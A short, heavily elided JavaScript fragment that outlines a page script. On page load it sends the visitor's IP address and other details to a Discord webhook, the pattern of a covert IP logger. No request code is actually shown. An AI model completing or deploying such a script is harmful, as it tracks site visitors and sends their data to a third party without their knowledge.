async function sendUserIPToWebhook() {
  ...
  // Creating the embed for the Webhook with additional details
  const embed = {
  ...
  // Sending the embed with the additional data to the Discord webhook
...
// Wait for the page to load completely and then send the data
window.onload = async () => {
